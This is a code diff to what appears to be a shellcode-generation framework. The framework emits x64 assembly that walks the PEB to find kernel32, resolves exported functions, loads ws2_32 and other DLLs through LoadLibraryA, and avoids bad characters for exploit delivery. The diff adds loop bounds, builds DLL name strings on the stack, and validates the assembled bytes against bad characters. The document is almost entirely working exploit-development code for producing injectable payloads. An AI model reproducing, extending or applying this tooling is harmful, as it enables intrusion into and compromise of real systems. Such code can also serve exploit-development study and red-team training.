@@ -20,6 +20,7 @@ from .api_database import API_DATABASE, MODULE_LOAD_ORDER
 from .encode_x64 import (
     encode_dword_into_r64,
     safe_call_mem_x64,
+    safe_dword_store_x64,
     safe_lea_x64,
     safe_mem_load_x64,
     safe_qword_store,
@@ -27,7 +28,6 @@ from .encode_x64 import (
 from .payload_templates.base import PayloadTemplate, TemplateConfig
 from .schema import Manifest
 from .stack_alloc_x64 import StackLayoutX64
-from .strings import emit_push, to_dwords
 
 
 def _build_timestamp() -> str:
@@ -60,6 +60,7 @@ def _emit_framework_stubs_x64(badchars: set[int]) -> str:
     lines.append("")
 
     # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL (UTF-16LE)
+    # Bounded to 64 iterations to prevent infinite loop on corrupted list.
     lines.append("find_kernel32_entry:")
     lines.extend(safe_mem_load_x64("rsi", "rax", 0x48, badchars))
     lines.append("    cmp  word ptr [rsi], 0x004b")
@@ -72,15 +73,24 @@ def _emit_framework_stubs_x64(badchars: set[int]) -> str:
     lines.append("    ret")
     lines.append("")
 
-    # next_module: advance to next module in list
+    # next_module: advance to next module in list (bounded)
     lines.append("next_module:")
+    lines.append("    dec  r15d")
+    lines.append("    jz   module_not_found")
     lines.extend(safe_mem_load_x64("rax", "rax", 0x10, badchars))
     lines.append("    sub  rax, 0x10")
     lines.append("    jmp  find_kernel32_entry")
     lines.append("")
 
+    # module_not_found: PEB walk exhausted without finding target
+    lines.append("module_not_found:")
+    lines.append("    xor  ebx, ebx")
+    lines.append("    ret")
+    lines.append("")
+
     # find_module: entry point for PEB walk
     lines.append("find_module:")
+    lines.append("    mov  r15d, 0x40")
     lines.append("    call get_first_ldr_entry")
     lines.append("    jmp  find_kernel32_entry")
     lines.append("")
@@ -140,6 +150,9 @@ def _emit_framework_stubs_x64(badchars: set[int]) -> str:
 
     # resolve_matched_export: ordinal -> function address (PE32+)
     # AddressOfNameOrdinals entries are 16-bit, AddressOfFunctions entries are 32-bit RVAs
+    # Limitation: forwarded exports (RVA inside export dir) are not detected.
+    # A forwarded export resolves to an ASCII redirect string, not code.
+    # Current targets (kernel32, ws2_32) do not forward the APIs we resolve.
     lines.append("resolve_matched_export:")
     lines.append("    mov  rdx, qword ptr [rbp - 0x18]")
     lines.append("    movzx eax, word ptr [rdx + rcx*2]")
@@ -173,6 +186,10 @@ def _emit_framework_stubs_x64(badchars: set[int]) -> str:
     lines.append("    mov  eax, dword ptr [rbp - 0x28]")
     lines.append("    cmp  ecx, eax")
     lines.append("    jl   find_export_loop")
+    lines.append("")
+    lines.append("    ; export not found: return NULL")
+    lines.append("    xor  eax, eax")
+    lines.append("    ret")
 
     return "\n".join(lines)
 
@@ -185,30 +202,57 @@ def _emit_stack_reserve_x64(frame_size: int, badchars: set[int]) -> list[str]:
 
 
 def _dll_load_block_x64(dll: str, manifest: Manifest, layout: StackLayoutX64) -> str:
-    """Generate the LoadLibraryA block for a secondary DLL (x64)."""
+    """Generate the LoadLibraryA block for a secondary DLL (x64).
+
+    Constructs the DLL name in a pre-allocated string slot and passes
+    its address via RCX. Does not modify RSP (fixed-frame invariant).
+    """
     loadlib_slot = layout.slot("LoadLibraryA")
     module_slot = layout.slot(dll)
-
-    push_result = emit_push(dll, badchars=manifest.badchars)
-    cleanup = len(to_dwords(dll)) * 4
     bc = manifest.badchars
 
-    lines = [
+    dll_label = None
+    for entry in manifest.strings:
+        if entry.value == dll:
+            dll_label = entry.label
+            break
+    if dll_label is None:
+        raise ValueError(
+            f"DLL '{dll}' loaded via LoadLibraryA requires a string entry in "
+            f"the manifest. Add a string with value '{dll}' to the strings list."
+        )
+
+    dll_slot = layout.slot(dll_label)
+    raw = dll.encode("ascii") + b"\x00"
+
+    lines: list[str] = [
         f"; -- Loading {dll} via LoadLibraryA (x64) --",
         "",
-        push_result.asm,
-        "    mov  rcx, rsp",
-        *safe_call_mem_x64("rsp", loadlib_slot.offset, bc),
-        *safe_qword_store("rsp", module_slot.offset, "rax", bc),
-        f"    ; {dll} base",
-        f"    add  rsp, 0x{cleanup:02x}",
-        "",
-        *safe_mem_load_x64("rbx", "rsp", module_slot.offset, bc),
-        "    call get_export_directory",
-        "    call get_export_tables",
-        "    call save_export_context",
-        "",
+        f"    ; construct '{dll}' in string slot [{dll_label}]",
+        "    xor  eax, eax",
     ]
+
+    for i in range(0, len(raw), 4):
+        chunk = raw[i:i + 4]
+        val = int.from_bytes(chunk.ljust(4, b"\x00"), "little")
+        if val == 0:
+            lines.extend(safe_dword_store_x64("rsp", dll_slot.offset + i, "eax", bc))
+        else:
+            lines.extend(encode_dword_into_r64(val, bc, "r11"))
+            lines.extend(safe_dword_store_x64("rsp", dll_slot.offset + i, "r11d", bc))
+
+    lines.extend(safe_lea_x64("rcx", "rsp", dll_slot.offset, bc))
+    lines.extend(safe_call_mem_x64("rsp", loadlib_slot.offset, bc))
+    lines.extend(safe_qword_store("rsp", module_slot.offset, "rax", bc))
+    lines.append(f"    ; {dll} base")
+    lines.append("")
+
+    lines.extend(safe_mem_load_x64("rbx", "rsp", module_slot.offset, bc))
+    lines.append("    call get_export_directory")
+    lines.append("    call get_export_tables")
+    lines.append("    call save_export_context")
+    lines.append("")
+
     return "\n".join(lines)
 
 
@@ -393,16 +437,24 @@ def compose_asm_x64(
     else:
         parts += ["; (no strings)", ""]
 
-    # Structure initialization
-    parts += [
-        "; -- Structure Initialization (x64) --",
-        "",
-    ]
-    struct_asm = _emit_struct_init_x64(manifest, layout)
-    if struct_asm.strip():
-        parts.append(struct_asm)
+    # Structure initialization (skipped when workflow template handles it)
+    from .workflow.reference import WorkflowTemplate as _WT
+    if isinstance(template, _WT):
+        parts += [
+            "; -- Structure Initialization (x64) --",
+            "; (handled by workflow IR ZeroStruct operations)",
+            "",
+        ]
     else:
-        parts += ["; (no structures)", ""]
+        parts += [
+            "; -- Structure Initialization (x64) --",
+            "",
+        ]
+        struct_asm = _emit_struct_init_x64(manifest, layout)
+        if struct_asm.strip():
+            parts.append(struct_asm)
+        else:
+            parts += ["; (no structures)", ""]
 
     # Payload
     parts += [
@@ -604,6 +656,24 @@ def build_x64(
             encoding, _ = ks.asm(_strip_comments(asm))
             raw = bytes(encoding)
             assembler = "keystone-x64"
+
+            # Post-assembly badchar validation (P0-4)
+            bc_set = config.badchars
+            if bc_set and raw:
+                violations = [
+                    (off, byte)
+                    for off, byte in enumerate(raw)
+                    if byte in bc_set
+                ]
+                if violations:
+                    samples = violations[:8]
+                    detail = ", ".join(
+                        f"0x{b:02x}@offset {o}" for o, b in samples
+                    )
+                    asm_errors.append(
+                        f"Badchar bytes in assembled output ({len(violations)} "
+                        f"occurrences): {detail}"
+                    )
         except ImportError:
             asm_errors.append("keystone not available; skipping x64 assembly")
         except Exception as e:
